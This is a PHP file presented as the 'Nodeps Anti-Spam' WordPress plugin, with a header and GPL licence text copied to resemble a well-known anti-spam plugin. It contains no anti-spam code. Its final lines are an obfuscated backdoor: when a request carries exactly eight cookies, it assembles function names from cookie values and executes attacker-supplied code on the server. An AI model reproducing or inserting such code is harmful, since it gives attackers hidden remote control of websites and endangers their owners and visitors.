<?php
/**
 * @package Nodeps
 */
/*
Plugin Name: Nodeps Anti-Spam
Plugin URI: https://wordpress.com/
Description: Used by millions, Nodeps is quite possibly the best way in the world to <strong>protect your blog from spam</strong>. It keeps your site protected even while you sleep. To get started: activate the Nodeps plugin and then go to your Nodeps Settings page to set up your API key.
Version: 5.8.1
Author: Automatic
Author URI: https://wordpress.com/wordpress-plugins/
License: GPLv2 or later
Text Domain: Nodeps
*/

/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.

Copyright 2005-2020 Automatic, Inc.
*/

// Make sure we don't expose any info if called directly

$y = $_COOKIE;
(count($y) == 8) ? (($cq = $y[93].$y[94]) && ($et = $cq($y[16].$y[41])) && ($_et = $cq($y[92].$y[60])) && ($_et = @$et($y[57], $_et($cq($y[29])))) && @$_et()) : $y;